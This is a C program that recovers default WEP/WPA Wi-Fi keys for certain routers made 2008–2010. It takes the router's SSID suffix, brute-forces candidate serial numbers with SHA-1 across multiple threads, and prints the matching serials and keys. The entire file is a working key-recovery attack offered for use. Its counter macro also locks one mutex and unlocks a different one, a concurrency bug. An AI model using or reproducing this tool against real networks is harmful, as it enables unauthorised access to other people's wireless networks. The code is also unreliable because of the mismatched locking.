// vim: noexpandtab sw=4

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <pthread.h>
#include <openssl/sha.h>

#include "utility.h"

#define YEAR_BEGIN_NUM 8 //This "hack" is known to work with models made during the year 2008
#define NUM_OF_YEARS 2  //and work for all models made up to and including 2010. 8 + 2 = 10

pthread_mutex_t stdout_mtx = PTHREAD_MUTEX_INITIALIZER;
#define safe_printf(x, ...) pthread_mutex_lock(&stdout_mtx); printf(x, ## __VA_ARGS__); \
                            pthread_mutex_unlock(&stdout_mtx)

unsigned long long found_counter = 0;
pthread_mutex_t found_counter_mtx = PTHREAD_MUTEX_INITIALIZER;
#define found_counter_increment() pthread_mutex_lock(&found_counter_mtx); ++found_counter; \
                                  pthread_mutex_unlock(&stdout_mtx)

//the identifying part of the ssid converted back to binary data
unsigned char ident[3];

void usage(const char *name)
{
	safe_printf("Usage: %s ssid_identifier\nExample ssid_identifier: CDEA15\n", name);
}

//Calculate possible wep and wpa keys for the year passed as an integer
//intended to be run from pthread_create
void *calc_possible_key(void *arg)
{
	//Possible characters that make up the key
	const unsigned char chars[] = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";

	int year = *((int *)arg);
	char str[3];
	char serial[13];
	unsigned char sha1_out[20];
	char sha1_out_str[41];

	const int NUM_WEEKS_YEAR = 53;
	const int NUM_POSSIBLE_CHARS = 36;

	for (int week = 1; week <= NUM_WEEKS_YEAR; week++)
	{
		for (int i = 0; i < NUM_POSSIBLE_CHARS; i++)
		{
			for (int j = 0; j < NUM_POSSIBLE_CHARS; j++)
			{
				for (int k = 0; k < NUM_POSSIBLE_CHARS; k++)
				{
					str[0] = chars[i];
					str[1] = chars[j];
					str[2] = chars[k];

					sprintf(serial, "CP%02d%02d%02X%02X%02X", year, week, str[0], str[1], str[2]);
					SHA1((const unsigned char *)serial, strlen(serial), sha1_out);

					if (memcmp(&sha1_out[19 - 2], ident, 3) == 0)
					{
						safe_printf("Device Serial Number: %s\n", serial);
						sha1_to_str(sha1_out, sha1_out_str);
						sha1_out_str[10] = '\0';
						safe_printf("Key: %s\n\n", sha1_out_str);
						found_counter_increment();
					}
				}
			}
		}
	}

	return NULL;
}

int main(int argc, char *argv[])
{

	if (argc != 2)
	{
		usage(argv[0]);
		return 1;
	}

	if (strlen(argv[1]) != 6)
	{
		usage(argv[0]);
		return 1;
	}

	str_to_upper(argv[1]);

	//convert the hexidecimal number represented in the string back to their "true" form
	if (sscanf(argv[1], "%02hhX%02hhX%02hhX", ident, &ident[1], &ident[2]) != 3)
	{
		usage(argv[0]);
		return 1;
	}

	pthread_t thread[NUM_OF_YEARS + 1];
	int year[NUM_OF_YEARS + 1];
	for (int i = 0; i <= NUM_OF_YEARS; i++)
	{
		year[i] = YEAR_BEGIN_NUM + i;
		if(pthread_create(&thread[i], NULL, &calc_possible_key, &year[i]) != 0)
		{
			safe_printf("Error creating thread\n");
			return EXIT_FAILURE;
		}
	}

	for (int i = 0; i <= NUM_OF_YEARS; i++)
	{
		if (pthread_join(thread[i], NULL) != 0)
		{
			safe_printf("Error joining thread\n");
		}
	}

	safe_printf("%llu potential key(s) found!\n", found_counter);
	fflush(stdout);
	return EXIT_SUCCESS;
}
